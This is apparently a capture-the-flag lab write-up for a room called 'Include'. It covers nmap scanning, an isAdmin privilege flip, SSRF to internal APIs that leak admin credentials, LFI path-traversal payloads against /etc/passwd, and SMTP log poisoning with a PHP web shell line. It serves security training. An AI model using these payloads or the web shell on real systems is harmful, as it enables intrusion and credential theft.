---
layout: post
title: Include ADV.APP
date: 19-04-2025
categories: [Medium]
tags: [LFI, RCE]
image: "https://cdn.prod.website-files.com/685c900b0c490f1ae20e1953/686e9de66b4e5d36e5dc4400_The%20Hidden%20Dangers%20of%20Overexposed%20Data_%20What%20Hackers%20Look%20For.jpg"
---

> You have to turn Off your electronic devices as we take off.
{: .prompt-danger }


## Scanning

```
PORT      STATE SERVICE  REASON         VERSION
22/tcp    open  ssh      syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a5:78:ab:2e:96:d9:aa:e8:19:5d:ed:b1:25:61:68:09 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDR6NLoe2aTwuvzx7SEzXYPCNi3Sy8IZY7h8h96UGm8Dmx63cAxztF4plCEPeKyX03wBQ0ltwr6VAmPQW7cxvrWXxTRVQitrgPu+BvVuUqOdqRw8dMU0UoqM9/3PaMEn8RL3MrGIb+yqnK0hNi4Y43inBLunSzwrq83vw9zMGbfytyIjXvtK/mIffvlqgQLsOYnLazX9H8mj6GvnSIYOd6c234SVN50i9IJdaIi3Q+vGuQH+RFCELG5+X8acaYeawzXpAIMUT9KzS0YXUfZ/7xT/Xuny7GKEdE7NVCfJT9bVwKyjTY8yQQVDX4/wK0usEWDNX1YYiEy2c7VONzNa7rwHRbizGuNUb37n6RPy9o72MRqJ84ckCH0TlaHOAxv6aWor0BzTF4E6tcJnXjb5D+gl/A1Yhcr2o4+k8kCwkeF7ij5o9Yzu/pL+nBWubM/Wk4p226tf+LybWK3j+4ey/0BAZM7oTCqhIZgHTvOMvyTT3DlxFOUmloqWY6q205asYc=
|   256 7a:c0:5b:ae:e2:c7:98:3b:d0:bb:1b:38:67:73:e0:87 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOA3oy3pottUIy9d+L21w1B0Tl4n0sm/NhfOh64T/+GPk13e4eLJ7TxflqWa7VZeXK6V/7YpxFZc4xW+V9lDHHU=
|   256 d7:cf:a4:6c:09:41:96:33:6d:e1:9d:f0:a5:be:20:4b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICTCgyy2FuLN3fNjS56sRdUzWNbthd/v62RLZkyN0+wu
110/tcp   open  pop3     syn-ack ttl 63 Dovecot pop3d
| ssl-cert: Subject: commonName=ip-10-10-31-82.eu-west-1.compute.internal
| Subject Alternative Name: DNS:ip-10-10-31-82.eu-west-1.compute.internal
| Issuer: commonName=ip-10-10-31-82.eu-west-1.compute.internal
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-11-10T16:53:34
| Not valid after:  2031-11-08T16:53:34
| MD5:   05c8:4559:9811:a54f:9c53:b3ee:f6ad:f0fd
| SHA-1: a24d:7a7f:9ac1:8045:5c5f:5b7c:721a:4e21:0599:ed7c
| -----BEGIN CERTIFICATE-----
| MIIDOTCCAiGgAwIBAgIUZOpVp2fjesLBhoJHfQXOvrRFh2AwDQYJKoZIhvcNAQEL
| BQAwNDEyMDAGA1UEAwwpaXAtMTAtMTAtMzEtODIuZXUtd2VzdC0xLmNvbXB1dGUu
| aW50ZXJuYWwwHhcNMjExMTEwMTY1MzM0WhcNMzExMTA4MTY1MzM0WjA0MTIwMAYD
| VQQDDClpcC0xMC0xMC0zMS04Mi5ldS13ZXN0LTEuY29tcHV0ZS5pbnRlcm5hbDCC
| ASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBANCGzRe8Ucyrg1ICrmylNf/G
| Dhe8gGUJsnSdBBwzEhofznOXvjGJ/P+5/ScXSNm5Bb632xtPcZ3wSq9xHq8JqZMu
| oXjoyd4U6VK6aV4xjxlwdE33DgsAHXORv9PkMi+NeYDFsJrdRznSV64mc9xhIqSk
| WdnALkBXvNZcTwy6feITP3F4YTGa5ewRNJSVutU4hBY1CfroZxRnff6kkbF0iqQc
| dSHPjK3NeAZnp4iVID8rBuV/fjjOtZ53z1u6cXmQVc2fljvD4GN3TxV4MKbazqOb
| +kEYdT5MiBEIJjQddhagbMWDYPF7McDSS/I3y4KdL1mI40Fjr6sXKOetrFvRZ+cC
| AwEAAaNDMEEwCQYDVR0TBAIwADA0BgNVHREELTArgilpcC0xMC0xMC0zMS04Mi5l
| dS13ZXN0LTEuY29tcHV0ZS5pbnRlcm5hbDANBgkqhkiG9w0BAQsFAAOCAQEArHg4
| zvCqUMzbSvusDU3d4cPDYnh7a7fAdOeVxHWo8/z/gzB8/ojJ8oYtfDV3qdKRhg0m
| pGSG3A2MZvl9u4FYj2tI8sne5HNTGRNg+3DLR/O9lFR90TH4v4piyAJrc29nFmpe
| Mq8I+JOizeSVG9qMSp6s0hDcHGAs111avS5TkEUvL0GybJIIQabOMDJ1e+Mptca+
| iV+Z+rdfirNzw87twkMxEpwTVPf3h5G0EKwE62Ih8cG1Pk/NrZCz5lN5P2b2BwHQ
| wbmbTgiA+hBmWajlHVu7EwEIsnMGrzTgSacVhHd7WsThLlMQwgNIowzUMagIA0yD
| s6SpR/+RIiQzeFiuTw==
|_-----END CERTIFICATE-----
|_pop3-capabilities: TOP RESP-CODES UIDL SASL PIPELINING AUTH-RESP-CODE STLS CAPA
143/tcp   open  imap     syn-ack ttl 63 Dovecot imapd (Ubuntu)
| ssl-cert: Subject: commonName=ip-10-10-31-82.eu-west-1.compute.internal
| Subject Alternative Name: DNS:ip-10-10-31-82.eu-west-1.compute.internal
| Issuer: commonName=ip-10-10-31-82.eu-west-1.compute.internal
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-11-10T16:53:34
| Not valid after:  2031-11-08T16:53:34
| MD5:   05c8:4559:9811:a54f:9c53:b3ee:f6ad:f0fd
| SHA-1: a24d:7a7f:9ac1:8045:5c5f:5b7c:721a:4e21:0599:ed7c
| -----BEGIN CERTIFICATE-----
| MIIDOTCCAiGgAwIBAgIUZOpVp2fjesLBhoJHfQXOvrRFh2AwDQYJKoZIhvcNAQEL
| BQAwNDEyMDAGA1UEAwwpaXAtMTAtMTAtMzEtODIuZXUtd2VzdC0xLmNvbXB1dGUu
| aW50ZXJuYWwwHhcNMjExMTEwMTY1MzM0WhcNMzExMTA4MTY1MzM0WjA0MTIwMAYD
| VQQDDClpcC0xMC0xMC0zMS04Mi5ldS13ZXN0LTEuY29tcHV0ZS5pbnRlcm5hbDCC
| ASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBANCGzRe8Ucyrg1ICrmylNf/G
| Dhe8gGUJsnSdBBwzEhofznOXvjGJ/P+5/ScXSNm5Bb632xtPcZ3wSq9xHq8JqZMu
| oXjoyd4U6VK6aV4xjxlwdE33DgsAHXORv9PkMi+NeYDFsJrdRznSV64mc9xhIqSk
| WdnALkBXvNZcTwy6feITP3F4YTGa5ewRNJSVutU4hBY1CfroZxRnff6kkbF0iqQc
| dSHPjK3NeAZnp4iVID8rBuV/fjjOtZ53z1u6cXmQVc2fljvD4GN3TxV4MKbazqOb
| +kEYdT5MiBEIJjQddhagbMWDYPF7McDSS/I3y4KdL1mI40Fjr6sXKOetrFvRZ+cC
| AwEAAaNDMEEwCQYDVR0TBAIwADA0BgNVHREELTArgilpcC0xMC0xMC0zMS04Mi5l
| dS13ZXN0LTEuY29tcHV0ZS5pbnRlcm5hbDANBgkqhkiG9w0BAQsFAAOCAQEArHg4
| zvCqUMzbSvusDU3d4cPDYnh7a7fAdOeVxHWo8/z/gzB8/ojJ8oYtfDV3qdKRhg0m
| pGSG3A2MZvl9u4FYj2tI8sne5HNTGRNg+3DLR/O9lFR90TH4v4piyAJrc29nFmpe
| Mq8I+JOizeSVG9qMSp6s0hDcHGAs111avS5TkEUvL0GybJIIQabOMDJ1e+Mptca+
| iV+Z+rdfirNzw87twkMxEpwTVPf3h5G0EKwE62Ih8cG1Pk/NrZCz5lN5P2b2BwHQ
| wbmbTgiA+hBmWajlHVu7EwEIsnMGrzTgSacVhHd7WsThLlMQwgNIowzUMagIA0yD
| s6SpR/+RIiQzeFiuTw==
|_-----END CERTIFICATE-----
|_imap-capabilities: listed OK have LITERAL+ STARTTLS capabilities IMAP4rev1 post-login LOGINDISABLEDA0001 SASL-IR more Pre-login ID LOGIN-REFERRALS ENABLE IDLE
993/tcp   open  ssl/imap syn-ack ttl 63 Dovecot imapd (Ubuntu)
|_imap-capabilities: listed OK AUTH=LOGINA0001 AUTH=PLAIN IDLE capabilities IMAP4rev1 post-login have SASL-IR more Pre-login ID LOGIN-REFERRALS ENABLE LITERAL+
| ssl-cert: Subject: commonName=ip-10-10-31-82.eu-west-1.compute.internal
| Subject Alternative Name: DNS:ip-10-10-31-82.eu-west-1.compute.internal
| Issuer: commonName=ip-10-10-31-82.eu-west-1.compute.internal
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-11-10T16:53:34
| Not valid after:  2031-11-08T16:53:34
| MD5:   05c8:4559:9811:a54f:9c53:b3ee:f6ad:f0fd
| SHA-1: a24d:7a7f:9ac1:8045:5c5f:5b7c:721a:4e21:0599:ed7c
| -----BEGIN CERTIFICATE-----
| MIIDOTCCAiGgAwIBAgIUZOpVp2fjesLBhoJHfQXOvrRFh2AwDQYJKoZIhvcNAQEL
| BQAwNDEyMDAGA1UEAwwpaXAtMTAtMTAtMzEtODIuZXUtd2VzdC0xLmNvbXB1dGUu
| aW50ZXJuYWwwHhcNMjExMTEwMTY1MzM0WhcNMzExMTA4MTY1MzM0WjA0MTIwMAYD
| VQQDDClpcC0xMC0xMC0zMS04Mi5ldS13ZXN0LTEuY29tcHV0ZS5pbnRlcm5hbDCC
| ASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBANCGzRe8Ucyrg1ICrmylNf/G
| Dhe8gGUJsnSdBBwzEhofznOXvjGJ/P+5/ScXSNm5Bb632xtPcZ3wSq9xHq8JqZMu
| oXjoyd4U6VK6aV4xjxlwdE33DgsAHXORv9PkMi+NeYDFsJrdRznSV64mc9xhIqSk
| WdnALkBXvNZcTwy6feITP3F4YTGa5ewRNJSVutU4hBY1CfroZxRnff6kkbF0iqQc
| dSHPjK3NeAZnp4iVID8rBuV/fjjOtZ53z1u6cXmQVc2fljvD4GN3TxV4MKbazqOb
| +kEYdT5MiBEIJjQddhagbMWDYPF7McDSS/I3y4KdL1mI40Fjr6sXKOetrFvRZ+cC
| AwEAAaNDMEEwCQYDVR0TBAIwADA0BgNVHREELTArgilpcC0xMC0xMC0zMS04Mi5l
| dS13ZXN0LTEuY29tcHV0ZS5pbnRlcm5hbDANBgkqhkiG9w0BAQsFAAOCAQEArHg4
| zvCqUMzbSvusDU3d4cPDYnh7a7fAdOeVxHWo8/z/gzB8/ojJ8oYtfDV3qdKRhg0m
| pGSG3A2MZvl9u4FYj2tI8sne5HNTGRNg+3DLR/O9lFR90TH4v4piyAJrc29nFmpe
| Mq8I+JOizeSVG9qMSp6s0hDcHGAs111avS5TkEUvL0GybJIIQabOMDJ1e+Mptca+
| iV+Z+rdfirNzw87twkMxEpwTVPf3h5G0EKwE62Ih8cG1Pk/NrZCz5lN5P2b2BwHQ
| wbmbTgiA+hBmWajlHVu7EwEIsnMGrzTgSacVhHd7WsThLlMQwgNIowzUMagIA0yD
| s6SpR/+RIiQzeFiuTw==
|_-----END CERTIFICATE-----
4000/tcp  open  http     syn-ack ttl 63 Node.js (Express middleware)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Sign In
50000/tcp open  http     syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: System Monitoring Portal
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=8/10%OT=22%CT=%CU=39411%PV=Y%DS=2%DC=T%G=N%TM=68981CCA
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)SEQ(
OS:SP=102%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M508ST11NW7%O2=M508ST11N
OS:W7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST11NW7%O6=M508ST11)WIN(W1=F4B3
OS:%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M508
OS:NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R
OS:=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=
OS:AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=
OS:40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID
OS:=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 35.701 days (since Sat Jul  5 14:25:15 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   248.84 ms 10.11.0.1
2   248.89 ms 10.10.64.179

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 07:15
Completed NSE at 07:15, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 07:15
Completed NSE at 07:15, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 07:15
Completed NSE at 07:15, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 98.51 seconds
           Raw packets sent: 64 (4.412KB) | Rcvd: 53 (3.604KB)

```

## Enumeration sector
<img width="1296" height="916" alt="Screenshot From 2025-08-10 07-18-57" src="https://github.com/user-attachments/assets/986ae3b6-3490-41d5-be8c-901a044cdbb2" />
<img width="890" height="541" alt="Screenshot From 2025-08-10 07-50-47" src="https://github.com/user-attachments/assets/5c15bbb8-3ee8-4efc-8024-4337f7fe8099" />


[http://10.10.64.179:4000/signin](http://10.10.64.179:4000/signin)
i foudn the login page here and try to use the credentials found on the page that was guest/guest and successfully loged in

```
guest
mary
david

```

```

    id: 1
    name: "guest"
    age: 25
    country: "UK"
    albums: [{"name":"USA Trip","photos":"www.thm.me"}]
    isAdmin: false
    profileImage: "/images/prof1.avif"

```

This was the sub domain and i added it so far

```
www.thm.me

```

i try to say antidot and 1212 it was placed at the button of the page so i try to say isAdmin true then was successfull changed the state of isAdmin to true wow!

<img width="1296" height="916" alt="Screenshot From 2025-08-10 07-31-13" src="https://github.com/user-attachments/assets/5e812849-f8ed-4b05-a12a-7e8b865421d0" />
<img width="1296" height="916" alt="Screenshot From 2025-08-10 07-35-44" src="https://github.com/user-attachments/assets/f31a5f80-203e-4feb-b805-54628e99b4cd" />

Finally i can access the admin settings and lets try to do SSRF to see if we can call then from out side
<img width="1296" height="577" alt="Screenshot From 2025-08-10 07-44-02" src="https://github.com/user-attachments/assets/e7acc62f-a902-466d-a6c9-3ff896ec4100" />


Next lets see on api
<img width="1920" height="869" alt="image" src="https://github.com/user-attachments/assets/dd021418-cbe8-4e1b-a764-995024269a60" />

<img width="890" height="541" alt="Screenshot From 2025-08-10 07-45-00" src="https://github.com/user-attachments/assets/5e964c8d-e5b6-4880-9e9c-943ffe876722" />

```python
http://127.0.0.1:5000/internal-api

data:application/json; charset=utf-8;base64,eyJzZWNyZXRLZXkiOiJzdXBlclNlY3JldEtleTEyMyIsImNvbmZpZGVudGlhbEluZm8iOiJUaGlzIGlzIHZlcnkgY29uZmlkZW50aWFsIGluZm9ybWF0aW9uLiBIYW5kbGUgd2l0aCBjYXJlLiJ9
```

```python
http://127.0.0.1:5000/getAllAdmins101099991

data:application/json; charset=utf-8;base64,eyJSZXZpZXdBcHBVc2VybmFtZSI6ImFkbWluIiwiUmV2aWV3QXBwUGFzc3dvcmQiOiJhZG1pbkAhISEiLCJTeXNNb25BcHBVc2VybmFtZSI6ImFkbWluaXN0cmF0b3IiLCJTeXNNb25BcHBQYXNzd29yZCI6IlMkOSRxazZkIyoqTFFVIn0=

```

```python
{"ReviewAppUsername":"admin","ReviewAppPassword":"admin@!!!","SysMonAppUsername":"administrator","SysMonAppPassword":"S$9$qk6d#**LQU"}
```

I found the symon app here


We are in dude
<img width="890" height="541" alt="Screenshot From 2025-08-10 07-50-47" src="https://github.com/user-attachments/assets/1e9303dc-a9fd-4d05-bd5c-71a33596133d" />


Viewing the source page If you cant try use chrome or disable the javascript[js] in briowser

<img width="1915" height="485" alt="Screenshot From 2025-08-10 07-52-10" src="https://github.com/user-attachments/assets/78bf6c2f-615b-4de5-a8a6-6357c6d02da5" />

```python
view-source:http://10.10.64.179:50000/profile.php?img=../../../../../../../../../etc/hosts
http://10.10.64.179:50000/profile.php?img=....//....//....//....//....//....//....//....//....//etc/passwd
```
<img width="1264" height="610" alt="image(1)" src="https://github.com/user-attachments/assets/e0265628-f4a7-4d81-96c1-3a038e0a5512" />


lets use burp

<img width="1899" height="846" alt="Screenshot From 2025-08-10 08-13-18" src="https://github.com/user-attachments/assets/39f8fe80-7267-4fda-a3de-f9dcc36a05df" />

## Log poisoning

i try apache2 log poisone but i remembed there was 25 port open lets try to access /var/log/mail.log

<img width="1915" height="485" alt="Screenshot From 2025-08-10 08-03-02" src="https://github.com/user-attachments/assets/108a676f-065a-477f-b610-a58319338462" />

```python
~/Desktop/redteam/THM/include » telnet 10.10.64.179 25                                             130 ↵ cyberkid@kali
Trying 10.10.64.179...
Connected to 10.10.64.179.
Escape character is '^]'.
220 mail.filepath.lab ESMTP Postfix (Ubuntu)
MAIL FROM: cyberkiddle.com
250 2.1.0 Ok
RCPT TO: <?php system($_GET['cmd']); ?>
501 5.1.3 Bad recipient address syntax

```

<img width="980" height="434" alt="Screenshot From 2025-08-10 08-37-47" src="https://github.com/user-attachments/assets/0767faaa-86d8-46d7-9c96-631f0feff05a" />


<img width="1899" height="846" alt="Screenshot From 2025-08-10 08-17-17" src="https://github.com/user-attachments/assets/5945393d-ac03-43c5-9722-baa6c2607547" />

> Thak you so much, upcomming new hard and technichues.
{: .prompt-danger }
